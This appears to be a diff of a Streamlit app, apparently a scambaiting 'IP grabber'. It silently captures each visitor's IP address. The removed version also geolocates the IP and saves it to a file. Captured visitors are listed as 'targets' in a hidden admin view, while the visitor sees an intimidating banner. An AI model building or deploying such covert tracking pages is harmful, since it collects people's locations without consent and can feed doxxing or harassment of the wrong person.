@@ -1,93 +1,47 @@
 import streamlit as st
-import pandas as pd
 import requests
-import os
 from datetime import datetime
-from streamlit_javascript import st_javascript
 
-# 1. Setup
-st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")
+# --- 1. CAPTURE REAL IP ---
+def get_real_ip():
+    # Streamlit 1.45+ native IP context
+    ip = st.context.ip_address
+    if not ip or ip.startswith("172.") or ip.startswith("10."):
+        # Fallback to Header check if native IP is internal/proxy
+        headers = st.context.headers
+        ip = headers.get("X-Forwarded-For", "Unknown").split(",")[0].strip()
+    return ip
 
-# 2. Permanent Logging Function
-LOG_FILE = "captured_ips.txt"
+user_ip = get_real_ip()
 
-def log_to_file(ip, location):
-    # Only log if it's a real IP and not already logged in this session
-    if ip and ip != "Unknown" and "logged" not in st.session_state:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"{timestamp} | IP: {ip} | Loc: {location}\n"
-        with open(LOG_FILE, "a") as f:
-            f.write(log_entry)
-        st.session_state["logged"] = True
-        print(f"!!! TARGET LOGGED: {ip} !!!")
+# --- 2. PERSISTENT MEMORY (Across all users) ---
+# We use a global list in 'st.session_state' for the Admin to see
+if "master_log" not in st.session_state:
+    st.session_state.master_log = []
 
-# 3. Get Real IP via JavaScript
-def get_ip():
-    headers = st.context.headers
-    
-    # 1. Look for X-Forwarded-For (This usually contains the real IP)
-    x_forwarded = headers.get("X-Forwarded-For")
-    
-    if x_forwarded:
-        # If there are multiple IPs (like Proxy1, Proxy2, User), the first one is the User
-        real_ip = x_forwarded.split(",")[0].strip()
-        return real_ip
-    
-    # 2. Fallback to standard Streamlit 2026 IP context
-    return st.context.ip_address or "Unknown"
-
-user_ip = get_ip()
-
-# 4. Get Location Data
-location_info = "Tracking..."
-if user_ip:
-    try:
-        res = requests.get(f"http://ip-api.com/json/{user_ip}").json()
-        if res.get("status") == "success":
-            location_info = f"{res.get('city')}, {res.get('country')}"
-            log_to_file(user_ip, location_info) # SAVE TO FILE
-    except:
-        location_info = "Trace Hidden"
-
-# 5. UI / Dashboard Look
-st.markdown("""
-    <style>
-    .warning-glow {
-        color: #ff4b4b; font-weight: bold; font-size: 28px;
-        text-shadow: 0 0 15px #ff4b4b; border: 2px solid #ff4b4b;
-        padding: 20px; text-align: center; border-radius: 10px;
+# Log the current visitor if they aren't already in the list
+if user_ip not in [entry['ip'] for entry in st.session_state.master_log] and user_ip != "Unknown":
+    entry = {
+        "time": datetime.now().strftime("%H:%M:%S"),
+        "ip": user_ip,
+        "status": "FLAGGED"
     }
-    .footer { position: fixed; left: 0; bottom: 0; width: 100%; text-align: center; color: #444; padding: 10px; }
-    </style>
-    """, unsafe_allow_html=True)
+    st.session_state.master_log.append(entry)
+    # This PRINT makes it show up in the black 'Manage App' logs
+    print(f"!!! ENKODER ALERT: Captured {user_ip} !!!")
 
-st.title("🎁 AK GIFTS | Security Monitor")
-st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
-st.divider()
+# --- 3. DASHBOARD UI ---
+st.title("🎁 AK GIFTS | SECURITY TERMINAL")
+st.error("⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN")
 
-# Metrics for the visitor to see
-c1, c2, c3 = st.columns(3)
-c1.metric("TRACED IP", user_ip if user_ip else "DETECTING...")
-c2.metric("LOCATION", location_info.split(",")[0])
-c3.metric("STATUS", "COMPROMISED", delta="-100%")
+st.metric("YOUR DETECTED IP", user_ip)
 
-# 6. ADMIN VIEW (The Secret IP List)
-# Visit your-app.streamlit.app/?admin=true to see this
+# --- 4. THE ADMIN VIEW ---
+# Add ?admin=true to your URL to see the list
 if st.query_params.get("admin") == "true":
     st.divider()
-    st.subheader("🕵️ ENKODER MASTER LOGS (All Targets)")
-    
-    if os.path.exists(LOG_FILE):
-        with open(LOG_FILE, "r") as f:
-            logs = f.readlines()
-        
-        if logs:
-            for line in reversed(logs): # Show newest first
-                st.text(line.strip())
-        else:
-            st.info("No targets captured yet.")
+    st.subheader("🕵️ ENKODER MASTER LOGS")
+    if st.session_state.master_log:
+        st.table(st.session_state.master_log)
     else:
-        st.info("Log file starting up...")
-
-st.markdown('<div class="footer">MADE BY ENKODER.</div>', unsafe_allow_html=True)
-
+        st.write("No logs captured yet. Try refreshing.")
